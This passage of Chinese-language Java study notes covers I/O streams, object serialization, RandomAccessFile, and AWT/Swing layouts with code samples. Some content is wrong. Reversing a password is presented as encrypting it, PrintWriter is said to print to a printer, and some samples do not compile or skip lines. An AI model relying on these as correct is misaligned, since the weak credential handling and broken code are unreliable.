			String s=new String("hi,how are you");
			try
			{
				out.write(s.getBytes());
				out.close();
			}
			catch(IOException e)
			{
				System.out.println(e.getMessage());
			}
		}
	}
	class reciever extends Thread
	{
		private PipedInputStream in=new PipedInputStream();
		public PipedInputStream getPipeInputStream()
		{
			return in;
		}
		public void run()
		{
			byte[] buf=new byte[1024];
			String str=null;
			try
			{
				int len=in.read(buf);
				str=new String(buf,0,len);
				System.out.println(str);
				in.close();
			}
			catch(IOException e)
			{
				System.out.println(e.getMessage());
			}
		}
	}
	public class pipeStreamTestDrive
	{
		public static void main(String args[])throws Exception
		{
			sender s=new sender();
			reciever r=new reciever();
			PipedOutputStream outs=s.getPipeOutputStream();
			PipedInputStream ins=r.getPipeInputStream();
			outs.connect(ins);
			s.start();
			r.start();
		}
	}


**字符串节点流类**：用于访问字符串。如同一个管道，用于内存与字符串相连接。它们就没有字节流类了，只有字符流类。  
`StringReader`、`StringWriter`：访问字符串流类。以字符串作为节点。  

字符串节点流类使用示例：
>

`System.in`就是一个字节流对象，其就是和键盘相联系的。  
`System.out`也是一个字节流对象，是与显示器相联系的。

###包装流类
就是将*节点流类包装成新的流类*。  
`IM：`  
包装类的原理就是：*同样是使用这些流类将内存与节点相连接*，只不过相对于节点流类(直接使用节点本身进行构造)而言，这些节点都已经被包装了，而不再是赤裸外露的节点了。包装类也是一个管子，只不过同一个管子可以用于各种不同的节点，因为包装节点流类的构造方法的参数是各种各样的节点流类，也就是说它不用自己直接与节点打交道，而是与节点流类打交道。更方便了。
节点流是直接与`I/O`节点（文件、键盘、网络、磁盘等）相关联的，包装之后构成包装流类效率更高。  
包括以下几种：  
a. 缓冲流类。  
b. 过滤流类。  
c. 打印流类。  
d. 转换流类。  

注意：所有的流类，无论是节点流类还是包装流类，全部都继承自`InputStream`、`OutputStream`、`Reader`、`Writer`流类。

**缓冲流类**：由于内、外存的读取速度不一样。所以需要缓冲流类来进行缓冲。  
其实际上也是一个管子，只不过这个管子可以用于各种`I/O`节点（文件、键盘、网络、磁盘等），均可。也就是说，缓冲流类的构造方法里的参数可以是上面所言的所有种类的节点流类，可以是文件节点流类，也可以是管道节点流类，也可以是数组节点流类等。  
缓冲流类实际上是通过*将其他的节点流类包装形成的新的缓冲流类*。建立于过滤流之上。将字节流转换为字符流其好处是字符流类可以调用`readLine()`每次读取一行。  
由缓冲流类的构造方法可以看出：缓冲流类对象实际上都是`InputStream`、`OutputStream`、`Reader`、`Writer`流对象包装而成的。   
`BufferedInputStream`、`BufferedOutputStream`：实际上是`InputStream`、`OutputStream`对象包装而成的流类。  
`BufferedReader`、`BufferedWriter`：实际上是`Reader`、`Writer`对象包装而成的流类。  


**过滤流类**：实际中我们在程序中并不是直接使用节点流类，而是使用通过包装各节点流类获得的过滤流类。一般都是将*过滤流类*包装成*缓冲流类*进行使用的。  
使用过滤流的优点：  
1. 其建立在节点流的基础之上，可以消除节点流之间的差异，这样就会更加方便地进行面向过滤流编程。  
2. 使用过滤流的方法进行`I/O`更加便捷。  
`FilterInputStream`、`FilterOutputStream`:  
`FilterReader`、`FilterWriter`：  

过滤流类使用示例如下：
>

**打印流类**：用于在屏幕、打印机等上面打印的流类。
`PrintStream`、`PrintWriter`：都是用于将内存中的内容进行输出，不过前者输出至屏幕，后者输出至打印机。  
打印流类使用示例：  


**转换流类**：用于将*字节流转换为字符流*。很有用。  
`InputStreamReader`、`OutputStreamWriter`:转换流类。  
使用转换流类的原因是：字符流类可以用`ReadLine()`方法，可以一次阅读一行，而字节流类都没有这个方法。所以转换为字符流类更实用。  

转换流类、缓冲流类使用示例：
>
	import java.io.*;
	public class StreamReaderTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct args Stream class
			FileInputStream fis= new FileInputStream("E:/Java_source/fileStreamTest.java");
>		
			//transform the stream class into a reader class
			InputStreamReader reader = new InputStreamReader(fis);
>
			//transform the reader class into a Bufferedreader class
			BufferedReader br = new BufferedReader(reader);
>
			//use the readLine() func of BufferedReader to read a line in the text
			String tempstr = null;
			while((tempstr = br.readLine())!=null)
			{
				System.out.println(tempstr);
			}
		}
	}


**两个特殊的流对象**：`DataInputStream`、`DataOutputStream`,它们继承了过滤流。  
它们的特点就是：拥有的方法更多，可以读、写各种数据。  
`Data`流对象使用示例：
>
	import java.io.*;
	public class DataStreamTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a Stream class
			FileOutputStream fis= new FileOutputStream("E:/Java_source/fileStreamTest1.java");
>			
			//construct the DataOutputStream. 
			DataOutputStream dos = new DataOutputStream(fis);
>	
			//write the string into the file
			String tempstr = new String("hello");
			dos.writeBytes(tempstr);
			dos.close();
>			
			//construct a Stream class
			FileInputStream fis1= new FileInputStream("E:/Java_source/fileStreamTest.java");
>	
			//construct the DataInputStream.
			DataInputStream dis = new DataInputStream(fis1);
>			
			//read the string from the file
			byte[] by = new byte[1280];
			dis.readFully(by); 
			String str = new String(by);
			System.out.println(str);
			dis.close();
		}
	}

所有以`InputStream`结尾的流类都是*字节输入流*。  
所有以`OutputStream`结尾的流类都是*字节输出流*。  
所有以`Reader`结尾的流类都是*字符输入流*。  
所有以`Writer`结尾的流类都是*字符输出流*。  

**两个特殊的流对象**：`ObjectInputStream`、`ObjectOutputStream`，这两个类是用于序列化储存对象。见`Java`中的序列化。  


#Java中的序列化
--------------------
`Java`中的一切都是对象，放在内存中，我们常需要将`Java`中的对象通过序列化转换成二进制流来进行储存或者传输。  
转换成二进制流的目的：  
1. 我们有时候需要将对象储存在**外部存储器**中,这样，即使在程序结束运行之后，我们依旧可以从磁盘中将这个对象恢复出来。  
2. 有时候，我们需要将这些对象通过网络进行传输。  
出于以上的目的，我们就需要对这些对象进行序列化。序列化就是将内存中的对象与二进制流之间进行相互转换以进行储存或者传输。


那么Java中可序列化对象必须具有的特征：该对象的类必须实现以下任意两个接口之一：  
`Serializable`
接口(该接口中无任何方法，只是一个标志性的接口，实现该接口无需实现任何方法)、`Externalizable`
接口(该接口使用较少）。  

用于序列化的I/O流对象：  
`ObjectInputStream`：用于从二进制流中恢复对象。 最重要的方法是`readObject()`，用于从其他储存了对象的节点中读取对象，如，从文件中读取对象。  
`ObjectOutputStream`：用于将对象转换为二进制流进行储存。最重要的方法是`writeObject(Object obj)`用于将对象储存在一个`OutputStream中`，也就是储存于一个文件节点流中,如，将对象储存于文件中。

对象序列化与对象恢复使用示例：
>
	import java.io.*;
	//the class must implements the Serializable interface that it can be serialized
	class apple implements Serializable
	{
		private String name;
		private String color;
		apple()
		{
			this.name = "zhang";
			this.color = "red";
		}
		apple(String aname,String acolor)
		{
			this.name=aname;
			this.color=acolor;
		}
		public void setname(String aname)
		{
			this.name=aname;
		}
		public void setcolor(String acolor)
		{
			this.color=acolor;
		}
		public String getname()
		{
			return this.name;
		}
		public String getcolor()
		{
			return this.color;
		}
>	
		public String toString()
		{
			String str = "apple "+this.name+" "+this.color;
			return str;
		}
	}
>
	public class appleSerializableTest
	{
		public static void main(String[] args) throws Exception
			{
				apple ap = new apple("lisi","red");
				//after the finish of the program,the ap object will perish
				System.out.println(ap);
>			
				//write the ap object into the file and save it in the disk in binary stream form with the ObjectOutputStream class
				FileOutputStream fos = new FileOutputStream("apple.bin"); 
				ObjectOutputStream ops = new ObjectOutputStream(fos); 
				ops.writeObject(ap); 
>			
				//read the object from the file stored in the disk 
				FileInputStream fis = new FileInputStream("apple.bin"); 
				ObjectInputStream ois = new ObjectInputStream(fis);
				Object bp = ois.readObject();
				apple mp = (apple)bp;
				System.out.println(mp.getname());
			}	
	}

Java中序列化的机制
-----------
1. 对于一个要被序列化的对象，其所有的属性`Field`，也就是成员变量，都必须是可序列化的，也就是实现了`Serializable`接口。  
如：`Student`类有一个属性（成员变量）`Field`是`Teacher`。那么`Student`对象如果需要被序列化，那么除了`Student`类必须实现`Serializable`接口，它的属性`Field``Teacher`类也必须实现`Serializable`接口。这样才能保证能够被序列化。  
2. 序列化底层机制：  
a. 当我们每序列化一个对象，就会给这个对象一个编号。  
b. 如果是第一次序列化一个对象，就会真的将这个对象序列化成二进制流。  
c. 如果要序列化的对象已经在之前已经序列化过一次，那么此次就只序列化一个编号，而不会再序列化保存整个对象。也就是说只会序列化保存本次编号。  

这样的序列化机制的目的是：保证磁盘中的二进制流与内存中的对象相同。  

`transient`关键字：  
只能用于修饰属于实例对象的成员`Field`(不能是`static`修饰的类`Field`变量,因为`static`变量不储存于对象中）,表示对象的这个`Field`不能被序列化储存。  
使用`transient`防止对象的某些`Field`被序列化的原因是：对象的某些`Field`如：账号、密码等敏感信息就不能被序列化储存或者传输。所以需要使用`transient`对这些关键的`Field`进行修饰。

序列化底层机制示例：
>
	import java.io.*;
	//the class must implements the Serializable interface that it can be serialized
	class Student implements Serializable
	{
		private String name;
		private Teacher teacher;
		Student()
		{
		}
		Student(String aname,Teacher ateacher)
		{
			this.name=aname;
			this.teacher=ateacher;
		}
		public void setname(String aname)
		{
			this.name=aname;
		}
		public void setteacher(Teacher ateacher)
		{
			this.teacher=ateacher;
		}
		public String getname()
		{
			return this.name;
		}
		public Teacher getteacher()
		{
			return this.teacher;
		}
>		
		public String toString()
		{
			String str = "student "+this.name+" "+this.teacher.toString();
			return str;
		}
	}
>
		class Teacher implements Serializable
		{
			private String name;
		private int age;
		Teacher()
		{
		}
		Teacher(String aname,int aage)
		{
			this.name=aname;
			this.age=aage;
		}
		public void setname(String aname)
		{
			this.name=aname;
		}
		public void setage(int aage)
		{
			this.age=aage;
		}
		public String getname()
		{
			return this.name;
		}
		public int getage()
		{
			return this.age;
		}
>		
		public String toString()
		{
			String str = "teacher "+this.name+" "+this.age;
			return str;
		}
	}
>
	public class appleSerializableTestb
	{	
		public static void main(String[] args) throws Exception
			{
				Teacher tea = new Teacher("liu",23);
				Student stu = new Student("lisi",tea);
				//after the finish of the program,the ap object will perish
				System.out.println(stu);
>			
				FileOutputStream fos = new FileOutputStream("stu.bin"); 
				ObjectOutputStream ops = new ObjectOutputStream(fos); 
				//write the stu object into the file and save it in the disk in binary stream form with the ObjectOutputStream class
				ops.writeObject(stu); 
>			
				tea.setname("hu");
				tea.setage(50);
				//do not write the tea object into the file and do not save it in the disk in binary stream form with the ObjectOutputStream class again, because this object has been serialized in the object stu that it can not been serialized again
				ops.writeObject(tea); 
>			
				FileInputStream fis = new FileInputStream("stu.bin"); 
				ObjectInputStream ois = new ObjectInputStream(fis);
				//read the stu object from the file stored in the disk 
				Object bp = ois.readObject();
				//read the tea object from the file stored in the disk 
				//but the alteration of tea can not be read because the changed object can not be serialized 
				Object cp = ois.readObject();
				Student mp = (Student)bp;
				Teacher np = (Teacher)cp;
				System.out.println(mp.getname());
				System.out.println(np.getname());
			}	
	}

**完全自定义的序列化**：  
对于账号、密码等这些敏感信息，我们如果完全通过`transient`来阻止这些`Field`被序列化是不好的(在恢复的时候就根本没有了这些信息）。这时就可以使用定制的序列化来对这些`Field`进行加密。  

如果要使用自定义的序列化，就需要让这个**要被序列化的对象的类**实现两个方法：  
`private void writeObject(ObjectOutputStream out) throws IOException`、`private void readObject(ObjectInputStream in) throws IOException` 。  
但是要注意的是：这两个方法并不是`Serializable`接口中的方法。  
这两个方法是被**系统调用**以完成对象序列化的。注意是被系统自动调用，而不是被人为调用，我们在序列化对象的时候依旧是使用`writeObject()`、`readObject()`方法的。只不过这里实现了这两个方法表示在写入和读取的时候底层是使用我们自己定制的转换方法（可以理解为加密方法）。  

**版本号**：  
由于我们的类会经常修改、变化，所以无法知道在序列化读取的时候类是不是正确的。所以要给可序列化类一个版本号。
  
实际上上如果没有给版本号，系统也会默认给一个版本号。但是默认的这个版本号不稳定。  
使用`serialver.exe`工具以查看类的版本号: `serialver.exe UseaEncodeSerializableTest`  

自定义设置类的版本号：  
在类定义的最前面加上一句：`static final long serialVersionUID = 1.1;`即将该类的版本号设置为1，以后每修改一次这个类，就可以修改一下这个类的版本号。自定义版本号后更稳定。

使用方式示例：  
>
	import java.io.*;
	//the class must implements the Serializable interface that it can be serialized
	class user implements Serializable
	{
		//set the version of the class 
		static final long serialVersionUID = 1L;
>		
		private String name;
		private String password;
		user()
		{
			this.name = "zhang";
			this.password = "red";
		}
		user(String aname,String apassword)
		{
			this.name=aname;
			this.password=apassword;
		}
		public void setname(String aname)
		{
			this.name=aname;
		}
		public void setpassword(String apassword)
		{
			this.password=apassword;
		}
		public String getname()
		{
			return this.name;
		}
		public String getpassword()
		{
			return this.password;
		}
>	
		public String toString()
		{
			String str = "user "+this.name+" "+this.password;
			return str;
		}
>	
		//set method to encode the password by yourself that it can not be get after the serialization
		private void writeObject(ObjectOutputStream out) throws IOException
		{
			out.writeUTF(this.name);
			//you can encode the Field with the method you want
			out.writeUTF(new StringBuilder(this.password).reverse().toString());
		}
		//set method to read the fields but you can not decode the password
		private void readObject(ObjectInputStream in) throws IOException
		{
			this.name = in.readUTF();
			this.password = in.readUTF();
		}
	}	
>
	public class UseaEncodeSerializableTest
	{
		public static void main(String[] args) throws Exception
			{
				user us = new user("lisi","123");
				//after the finish of the program,the ap object will perish
				System.out.println(us);
>			
				//write the us object into the file and save it in the disk in binary stream form with the ObjectOutputStream class and the Field has been encoded then it can be saved or passed through the web
				FileOutputStream fos = new FileOutputStream("user.bin"); 
				ObjectOutputStream ops = new ObjectOutputStream(fos); 
				ops.writeObject(us);
>			
				//read the object from the file stored in the disk , but can not decode the password
				FileInputStream fis = new FileInputStream("user.bin"); 
				ObjectInputStream ois = new ObjectInputStream(fis);
				Object bp = ois.readObject();
				user mp = (user)bp;
				System.out.println(mp.getpassword());
			}	
	}	
**IM**：我们使用`I/O`流类的正常使用方法：  
1. 不会直接使用节点流类。而是将它们包装成包装类进行使用。  
2. 如果联系到键盘、文件、屏幕等节点设备，那么就是节点流类。  
a. *字节节点流类*要被包装成`BufferedInputStream`、`BufferedOutputStream`这样的包装缓冲流类使用。  
b. *字符节点流类*要被包装成`BufferedReader`、`BufferedWriter`这样的包装缓冲流类来使用。  
c. 如果是*字节节点流类*要转变成*字符包装类*使用，那么就使用`InputStreamReader`、`OutputStreamWriter`这样的转换流类进行转换为'字符包装类'。  

使用方法见下例：
>
	import java.io.*;
	public class StreamReaderTest
	{
		public static void main(String[] args) throws Exception
		{
			//this part is aimed at reading the file and printing it onto the screen
			//construct args Stream class object
			FileInputStream fis= new FileInputStream("E:/Java_source/fileStreamTest.java");
>		
			//transform the stream class object(file object) into a reader class object
			InputStreamReader reader = new InputStreamReader(fis);
>
			//transform the reader class object into a Bufferedreader class object
			BufferedReader br = new BufferedReader(reader);
>
			//use the readLine() func of BufferedReader to read a line in the text
			String tempstr = null;
			while((tempstr = br.readLine())!=null)
			{
				System.out.println(tempstr);
			}
>
>
			//this part is aimed at reading the keyboard and printing it onto the screen
			//transform the stream object(System.in is the keybord) into a reader class
			InputStreamReader reader = new InputStreamReader(System.in);
>
			//transform the reader class into a Bufferedreader class
			BufferedReader br = new BufferedReader(reader);
>
			//use the readLine() func of BufferedReader to read a line in the text
			String tempstr = null;
			while((tempstr = br.readLine())!=null)
			{
				System.out.println(tempstr);
			}
		}
	}

#Java中虚拟机读取其他进程数据
------------------
在`Java`中启动其他进程：  
`Runtime.getRuntime().exec()`;返回值是一个`Process`对象，就是一个进程，进程就是运行中的应用程序。  
注意：对于这个调用的进程而言，其输出的内容对于我们的`JVM`而言是输入，所以，`JVM`应该使用输入流。  

应用实例：  
>
	import java.io.*;
	public class ReadFromProcess
	{
		public static void main(String[] args) throws Exception
		{
			//create a process
			Runtime runtime = Runtime.getRuntime();
			Process proc = runtime.exec("javac.exe");
>
			//read from the process	
			InputStreamReader isr = new InputStreamReader(proc.getErrorStream()); 
			BufferedReader br = new BufferedReader(isr);
>		
			while(br.readLine()!=null)
			{
				System.out.println(br.readLine());
			}
		}	
	}

#Java中的RandomAccessFile类使用
-----------------
该类可以任意访问文件，也就是说，想访问文件中的哪个点就访问哪个点。  
特征：  
1. 可以读，可以写，相当于`inputStream`、`outputStream`的合体。还可以在末尾增加。不会覆盖原有的文件内容。  
2. `RandomAccessFile`的局限性：只能访问文件。别的都不能使用。  

在构建这个对象的时候，需要制定读写模式，("r")("rw")模式。  
体现了这个类的`Random`特性的方法是`seek(long pos)`:用于将记录指针移动到任意指定的位置。默认的记录指针在文件首部。  
1. 使用`RandomAccessFile`来在文件后面追加字符：  
a. 将记录指针移动到文件末尾   
b. 执行写入。  
2. 使用`RandomAccessFile`来在文件中插入字符：  
a. 将记录指针移动到将要插入的位置   
b. 将记录指针后面的内容读取并保存  
c. 输出要插入的内容  
d. 输入已经保存的内容  

追加与插入示例：
>
	import java.io.*;
	public class RandomAccessFileTest
	{
		public static void main(String[] args) throws Exception
		{
			//random seek the position
			RandomAccessFile raf = new RandomAccessFile("good.txt","rw");
>		
			//read the file
			byte[] br =  new byte[1024];
			raf.read(br);
			String tempstr = new String(br);
			System.out.println(tempstr);
>		
			//write into the file at the end postion of the file
			raf.seek(raf.length());
			String tempstr1 = new String("hello world!");
			byte[] br2 = tempstr1.getBytes();
			raf.write(br2);
>	
			//insert into the file at the specified position
			//save the contents after the position into the ByteArrayOutputStream object
			ByteArrayOutputStream bos = new ByteArrayOutputStream();
			byte[] br3 = new byte[1024];
			raf.seek(100);
			int hasRead = -1;
			while((hasRead=raf.read(br3))!=-1)
			{
				bos.write(br3,0,hasRead);
			}
>		
			//insert the string you want into the postion
			raf.seek(100);
			String tempstr2 = new String("hello world!");
			byte[] br4 = tempstr2.getBytes();
			raf.write(br4);
>		
			//insert the contents that have been saved into the end of the file currently
			raf.seek(raf.length());
			byte[] br5 =bos.toByteArray();
			raf.write(br5);
		}	 
	}
 
#Java中几个有用的类
----------
`Path`：接口。表示一个平台无关的路径。可以通过Paths工具类获得Path对象。  
传统的`File`类，既代表文件又代表路径。不好用。  
  
`Paths`：操作路径的工具类。里面有方法可以获得`Path`对象。  
`Files`：操作文件的工具类。可以直接操作文件。  
例如：要复制一个文件。不再需要使用I/O流进行复制、粘贴了。而是直接使用这个工具类即可。
`Arrays`：操作数组的工具类。  
`Collections`：操作集合的工具类。  
`Objects`：操作对象的工具类。  

`Files`类与`Paths`类使用示例：
>
	import java.nio.file.*;
	public class pathTest
	{
		public static void main(String[] args) throws Exception
		{
			//get the relative path
			Path path = Paths.get("1.java");
			Path path1 = Paths.get("4.java");
			Path path2 = Paths.get("C:/Python27/python.exe");
>			
			//get the absolute path and get the path root
			System.out.println((path.toAbsolutePath().getRoot()));  
>	
			//get the absolute path and git the path parents
			System.out.println((path.toAbsolutePath().getParent())); 
>		
			//test the file can be read
			System.out.println(Files.isReadable(path)); 
			//test the file is hidden
			System.out.println(Files.isHidden(path)); 
>		
			//copy the file in path to the file in path1
			Files.copy(path,path1,StandardCopyOption.REPLACE_EXISTING);
>		
			//test the file can be exec
			System.out.println(Files.isExecutable(path2));
		}
	}

Java中的界面编程
------------
`Java`在客户端上的表现并不突出，客户端程序主要集中在`Windows`平台上，`Java`主要集中在大型软件的服务器端编程。例如：电信、银行这些部门的软件，主要是B/S结构的，前端并不需要太复杂的实现。  

`Java`中界面组件进化历史：  
1. `AWT`(发布于JDK1.0)：一个`GUI`抽象窗口工具集，既然是抽象的，就并未为这个窗口工具集提供实现，而是调用了操作系统上的界面实现，以为了迎合操作系统的界面风格。因此AWT只能使用各个操作系统间界面组件的交集（例如：`Windows`下有按钮与图标，`linux`下有按钮与文本框，那么`AWT`中只能有按钮）所以`AWT`难以实现较好的界面。  
2. `Swing`发布，为绝大部分界面组件都提供了实现，所有的这些组件都是在黄将诶绘制在空白区域上。它自己实现了这些界面之间，所以其无需使用底层的系统组件，也就无需适配各个系统的交集。使得Swing的界面风格在各个系统中更加统一。


AWT:  
在`java.awt`包中，提供了基本的`Java`程序`GUI`设计工具：  
界面编程的本质步骤：  
1. 在创建添加界面组件之前，先创建一个容器。  
2. `new`一个界面组件。  
3. 把组件安在容器的某一个位置。

`AWT`界面组件  
界面组件设计的类结构图：如图所示。  
一切界面组件都是`Component`。  
一切的菜单组件都是`MenuComponent`。 

`Container`:容器，其本身既可以作为组件，也可以作为放置其他组件、容器的容器。
容器类对象可以使用方法`add()`来添加组件。
  
`Container`容器类的层次结构图：如图所示。  
继承Container类的有：`Window`（可独立存在）、`Panel`（不可独立存在，只能放在其他的`Container`中）、`ScrollPane`。  

继承`Window`的有`Frame`、`Dialog`。一般不直接使用`Window`而是使用`Frame`或者`Dialog`。  
`Frame`类：有标题，可通过拖拉改变大小。实际上就是代表一个窗口。

`Panel`容器：  
为放置组件提供空间。允许使用自己的布局管理器。不能单独存在，必须放置在其他的容器中。  

`AWT`中的布局管理器：  
布局管理器是一个非常有用的工具。如果不使用布局管理器，而是通过组件构造时的位置、大小来进行设置，那么会导致：  
1. 窗口大小改变的时候，窗口会变得难看。  
2. 平台改变的时候，窗口变得难以适应。

所谓的布局，就是组件位置与大小。使用布局管理器之后，更为简单，程序员无需显式控制组件的位置与大小，而是选择合适的布局管理器即可管理容器里面**各组件的位置布局**。  
布局管理器：  
1. `FlowLayout`：让组件在容器中横向排列，到顶就会自动折返到下一行。  
使用时被容器一次性调用`FlowLayout`，用于全局。  
2. `BorderLayout`：将容器分为五个区域，每个区域中都能放组件。各个区域会自动调整大小。如果某个区域没有组件，就会自动被别的区域占满。    
使用时容器一次一次为每一个组件调用`BorderLayout`的`Field`。每调用一次都只对这个组件有效果。  
但是并不表明每个区域只能放一个组件，可以使用`Panel`容器里放多个组件，然后将这个容器放在某一个区域即可。  
注意：任何一个布局管理器对象可以被任何一个容器使用，如，一个布局管理器既可以被一个`Frame`容器使用，也可以被一个`Panel`容器使用，然后可以使用这个布局管理器将这个`Panel`加到这个`Frame`容器中。  
3. `GridLayout`：将整个容器界面自定义划分成若干个块，然后对容器调用该布局管理器。即对全局的组件使用该布局管理器。   
4. `CardLayer`：将组件一个一个地叠加在一起。看到的只是最上面的那个组件。  
5. `GridBagLayout`：  
6. `BoxLayout`：是`Swing`里面的一个布局管理器。用法简单，功能强大。代替了`GridBagLayout`。要么是垂直方向排组件，要么横向排组件。   
7. 还可以不使用布局管理器：  
在`Frame`里设置布局管理器为`null`；然后对每一个组件都各自设置大小及位置。

注：内部类里访问局部变量，局部变量必须加上`Final`修饰。

`AWT`使用示例：
>	
	import java.awt.*;
	public class AWTFlowLayoutTest
	{
		public static void main(String[] args) throws Exception
		{
			FlowLayout fl = new FlowLayout(FlowLayout.CENTER,60,80);
>
			//construct a container
			Frame MainFrame = new Frame("hello");
			//set the size of the frame(container) and locate it on the postion you want
			MainFrame.setBounds(100,200,300,400);
>		
			//add the button with the default layout
			MainFrame.add(new Button("Yes"));
>
			//use the layout FlowLayout f1 for all the components
			MainFrame.setLayout(fl);
>		
			MainFrame.setVisible(true);
		}
	}

  
>
	import java.awt.*;
	public class AWTBorderLayoutTest
	{
		public static void main(String[] args) throws Exception
		{
			BorderLayout bl = new BorderLayout(10,10);
>		
			//construct a container
			Frame MainFrame = new Frame("hello");
			//set the size of the frame(container) and locate it on the postion you want
			MainFrame.setBounds(100,200,300,400);
>		
			//add new buttons with the layout b1
			MainFrame.add(new Button("East"),bl.EAST);
			MainFrame.add(new Button("West"),bl.WEST);
			MainFrame.add(new Button("North"),bl.NORTH);
			MainFrame.add(new Button("South"),bl.SOUTH); 
>		
			//create a panel with layout bl to contain two buttons
			Panel pl = new Panel(bl);
			pl.add(new Button("East"),bl.EAST);
			pl.add(new Button("West"),bl.WEST);
>
			//add the panel with layout bl
			MainFrame.add(pl,bl.CENTER);
>		
			MainFrame.setVisible(true);
		}
	}


>
	import java.awt.*;
	public class AWTGridLayoutTest
	{
		public static void main(String[] args) throws Exception
		{
			GridLayout gl = new GridLayout(2,2,5,5);
>		
			//construct a container
			Frame MainFrame = new Frame("hello");
			//set the size of the frame(container) and locate it on the postion you want
			MainFrame.setBounds(100,200,300,400);
>
			//set the layout gl
			MainFrame.setLayout(gl);
>
			//add buttons
			MainFrame.add(new Button("East"));
			MainFrame.add(new Button("West"));
			MainFrame.add(new Button("North"));
			MainFrame.add(new Button("South"));
			MainFrame.pack();
			MainFrame.setVisible(true);
		}
	}	



>
	import java.awt.*;
	public class AWTCardLayoutTest
	{
		public static void main(String[] args) throws Exception
		{
			CardLayout cl = new CardLayout(4,4);
>
			//construct a container
			Frame MainFrame = new Frame("hello");
			//set the size of the frame(container) and locate it on the postion you want
			MainFrame.setBounds(100,200,300,400);
>
			Panel pl = new Panel();
			//use the layout FlowLayout f1 for all the components
			pl.setLayout(cl);
>		
			//add the button with the default layout
			pl.add(new Button("East"));
			pl.add(new Button("West"));
			pl.add(new Button("North"));
			pl.add(new Button("South"));
>
			//cl.next(pl);
			MainFrame.add(pl,BorderLayout.NORTH);
>		
			Panel pl2 = new Panel();
			pl2.add(new Button("First"));
			pl2.add(new Button("Previous"));
			pl2.add(new Button("Next"));
			pl2.add(new Button("Last"));
>		
			MainFrame.add(pl2,BorderLayout.SOUTH);
			MainFrame.setVisible(true);
		}
	}



>
	import java.awt.*;
	import javax.swing.*;
	public class AWTBoxLayoutTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			Frame MainFrame = new Frame("hello");
			//set the size of the frame(container) and locate it on the postion you want
			MainFrame.setBounds(100,200,300,400);
>		
			//BoxLayout for MainFrame
			BoxLayout bl1 = new BoxLayout(MainFrame,BoxLayout.Y_AXIS);
			MainFrame.setLayout(bl1);
			MainFrame.add(new Button("1"));
			MainFrame.add(new Button("2"));
			MainFrame.add(new Button("3"));
>		
			Panel pl = new Panel();
			//BoxLayout for pl
			BoxLayout bl2 = new BoxLayout(pl,BoxLayout.X_AXIS);
			pl.setLayout(bl2);
			Panel pl1 = new Panel();
			//BoxLayout for pl1
			BoxLayout bl3 = new BoxLayout(pl1,BoxLayout.Y_AXIS);
			pl1.setLayout(bl3);
			pl1.add(new Button("4"));
			pl1.add(new Button("5"));
			pl.add(pl1);
			pl.add(new Button("6"));
>		
			MainFrame.add(pl);
>		
			MainFrame.setVisible(true);
		}
	}


Java中的Swing
-----------
由于`AWT`中的界面*组件*较少，所以导致界面不够美观。此时就需要使用`Swing`界面组件。  
`Java`中还有一套界面组件库，来自`IBM`的`SWT/JFaces`。
`Swing`功能更强大，使用更方便。  
`JComponent`：一切的`Swing`组件及`Swing`容器都属于（继承自）`JComponent`。`JFrame`、`JDialo`除外。  
由于`AWT`组件要调用底层系统的实现，所以被称为“重量级”组件。  
`Swing`组件是依靠自己实现，无需调用底层系统的实现，所以被称为“轻量级”组件。  

`JOptionPane`:是一个工具类，专用于弹出各种对话框。`static`方法有`showMessageDialog()`等。

`Swing`使用示例：
>
	import java.awt.*;
	import javax.swing.*;
	public class SwingTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>
			//JCheckBox
			MainFrame.add(new JCheckBox("good!"),bl.NORTH);
>		
			//JColorChooser
			JColorChooser.showDialog(MainFrame, "hi", Color.black); 
>		
			//JList
			String[] str = new String[]{"1","2","3"};
			MainFrame.add(new JList<String>(str),bl.SOUTH);
>		
			//JOptionPane
			System.out.println(JOptionPane.showInputDialog(null,"please input:"));
			MainFrame.setVisible(true);
		}
	}  

`JPanel`:类似与`Panel`。  
`JPasswordField`：密码输入框。
`JProgressBar`：进度条。  
`JRadioButton`：单选框。  
`JScrollBar`：滚动条。  
`JSplitPane`：分割面板。  
`JTabledPane`：窗口里面的`Tab`页面。  
`JTable`：表格。`JTable`必须放在`JScrollPane`中显示。  
`JToggleButton`：开关按钮。
`JToolBar`：做工具条。
`JToolBar.Separator`:工具条的分割线。  
`JToolTip`：工具条上的提示。

表格使用示例：
>
	import java.awt.*;
	import javax.swing.*;
	public class SwingTableTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>
			String[] str1 = new String[]{"Name","Age","Gender"};
			String[][] str2 = new String[][]{new String[]{"Jim","13","male"},new String[]{"Mary","15","female"},new String[]{"Jack","11","male"}};
>		
			JTable jt = new JTable(str2,str1);
			JScrollPane jsp = new JScrollPane(jt);
			MainFrame.add(jsp);
			MainFrame.setVisible(true);
		}
	}


工具条使用示例：
>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	public class SwingToolBarTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>
			JToolBar jtb = new JToolBar("good", JToolBar.HORIZONTAL);
			 Action ac1 = new AbstractAction("yes") 
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("yes");
				}
			};
			 Action ac2 = new AbstractAction("no") 
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("no");
				}
			};
			 Action ac3 = new AbstractAction("cancel") 
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("cancel");
				}
			};
			jtb.add(ac1);  
			jtb.add(ac2);  
			jtb.addSeparator(); 
			jtb.add(ac3);  
>		
		 	String[] str1 = new String[]{"Name","Age","Gender"};
			String[][] str2 = new String[][]{new String[]{"Jim","13","male"},new String[]{"Mary","15","female"},new String[]{"Jack","11","male"}};
>		
			JTable jt = new JTable(str2,str1);
			JScrollPane jsp = new JScrollPane(jt); 
			MainFrame.add(jsp);
			MainFrame.add(jtb,BorderLayout.NORTH);
